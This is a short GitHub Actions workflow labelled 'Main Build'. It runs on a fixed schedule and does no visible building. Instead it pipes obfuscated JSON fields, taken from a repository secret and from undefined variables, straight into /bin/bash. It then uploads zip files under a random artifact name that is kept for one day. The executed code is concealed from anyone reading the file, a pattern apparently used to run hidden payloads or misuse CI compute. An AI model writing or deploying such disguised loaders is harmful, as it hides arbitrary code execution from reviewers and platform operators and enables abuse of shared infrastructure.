name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '30 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          xshlt5: ${{ secrets.xshlt5 }}
        run: |
          printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
          printf '%s' "$rt385" | jq -r .swrmp4337 | /bin/bash
          echo $irlk88 | jq -r .ozg4 | /bin/bash
          echo $j59157 | jq -r .ag9 | /bin/bash
          echo $f678 | jq -r .zw74994 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sSfUyXdB
          path: "*.zip"
          retention-days: 1
